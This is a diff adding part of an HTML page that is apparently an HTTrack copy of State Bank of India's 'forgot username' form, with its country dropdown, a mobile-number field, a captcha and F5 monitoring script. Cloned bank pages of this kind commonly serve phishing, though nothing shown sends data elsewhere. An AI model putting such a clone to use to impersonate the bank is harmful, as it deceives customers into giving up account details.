+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=255>
+											Tanzania
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=66>
+											Thailand
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=228>
+											Togo
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=690>
+											Tokelau
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=676>
+											Tonga
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_TT>
+											Trinidad and Tobago
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=216>
+											Tunisia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=90>
+											Turkey
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=993>
+											Turkmenistan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=688>
+											Tuvalu
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_US>
+											UNITED STATES
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=256>
+											Uganda
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=380>
+											Ukraine
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=971>
+											United Arab Emirates
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=598>
+											Uruguay
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=998>
+											Uzbekistan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=678>
+											Vanuatu
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=379>
+											Vatican City
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=58>
+											Venezuela
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=84>
+											Viet Nam
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_VI>
+											Virgin Island (USA)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=681>
+											Wallis and Futuna
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=685>
+											Western Samoa
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=967>
+											Yemen
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=381>
+											Yugoslavia/Serbia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=260>
+											Zambia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=263>
+											Zimbabwe
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+					</select>		
+					</div>
+					<!--<div class="col-sm-4 col-md-3 col-comn toppadding"> For Canada, choose USA/CANADA</div> -->
+				</div>							
+				
+				<div class="form-group">
+					<label class="control-label col-sm-4 col-md-3 col-comn" for="amount">INB Registered Mobile Number <span class="mandatory_txt">*</span> </label>
+                    <div class="col-sm-2 col-xs-4 col-md-1">
+                    	<input name="country_Code1" type="text" size="3" maxlength="3" title="Country Code" id="country_Code1" value=''  disabled="true" class="form-control">
+                    </div>
+                    <div class="col-sm-2 col-md-2 col-xs-8">
+                    	<input class="form-control" name="mobileNumber" type="text" maxlength="4"   title= "Mobile Number" id="mobileNumber" onclick="SetMaxLength();"  value="">
+                    </div>
+					<div class="col-sm-5 col-md-4 col-xs-12 col-comn toppadding" id="area_code_mobile_reg"></div>
+				</div>
+				
+				<div class="form-group">
+					<label class="control-label col-sm-4 col-md-3 col-comn" for="amount">Enter the text as shown in the image <span class="mandatory_txt">*</span> </label>
+                    <div class="col-sm-2 col-md-2">
+                    	<input type="text" class="form-control" name="captchaValue" title="Captcha" size="9" maxlength="9"/>
+                    </div>
+					<div class="col-sm-2 col-md-2 col-xs-8 col-comn toppadding"><img src="lockaccountcaptcha.jpg" alt="Captcha"/>  </div>
+				</div>
+					
+				<div class="common_btn text-center">
+					<input name="bankCode" type="hidden" value="0"/>
+					<input name="issueCode" type="hidden" value="loginUserName"/>
+		 			<input name="Submit" type="submit" id="go" name="go" class="btn btn-default" value=" Submit " onclick="return submitForgotUserName(this.form)"> 
+				</div>
+						
+			</div>
+		</div>
+	<!-- //FAQ Content -->
+			
+	<!-- Footer -->
+	 	<div class="row" id="footer">
+			<footer>
+				<div id="footer_area">
+					<div class="col-lg-4 col-md-4 col-sm-4">
+						<p>&copy; State Bank of India</p>
+					</div>		
+				</div>
+			</footer>
+		</div> 
+	<!-- //Footer -->
+	
+	</div>
+<input type="hidden" name="ej6m" id="ej6m" value="i6dad5lajphv4dl6dcthf5plecka873g" />
+</form>
+</body>
+
+<!-- Mirrored from retail.onlinesbi.sbi/retail/forgotusernameconfirm.htm by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Sep 2024 05:19:14 GMT -->
+</html><script id="f5_cspm">(function(){var f5_cspm={f5_p:'AICLJFIOJBLLIONLEILMABICPLDAGCCLNGJNOJAFMDIJFCBHPJLOFGFIEMEGPDDKILNBMKFEAACLOPJIDDFAGOEOAACPNNJELKOOBCBECGKAKGHKEJELJEEICFDDFMMH',setCharAt:function(str,index,chr){if(index>str.length-1)return str;return str.substr(0,index)+chr+str.substr(index+1);},get_byte:function(str,i){var s=(i/16)|0;i=(i&15);s=s*32;return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);},set_byte:function(str,i,b){var s=(i/16)|0;i=(i&15);s=s*32;str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));return str;},set_latency:function(str,latency){latency=latency&0xffff;str=f5_cspm.set_byte(str,40,(latency>>8));str=f5_cspm.set_byte(str,41,(latency&0xff));str=f5_cspm.set_byte(str,35,2);return str;},wait_perf_data:function(){try{var wp=window.performance.timing;if(wp.loadEventEnd>0){var res=wp.loadEventEnd-wp.navigationStart;if(res<60001){var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);window.document.cookie='f5avr0425802195aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/;'+'';}
+return;}}
+catch(err){return;}
+setTimeout(f5_cspm.wait_perf_data,100);return;},go:function(){var chunk=window.document.cookie.split(/\s*;\s*/);for(var i=0;i<chunk.length;++i){var pair=chunk[i].split(/\s*=\s*/);if(pair[0]=='f5_cspm'&&pair[1]=='1234')
+{var d=new Date();d.setTime(d.getTime()-1000);window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;'+';';setTimeout(f5_cspm.wait_perf_data,100);}}}}
+f5_cspm.go();}());</script>
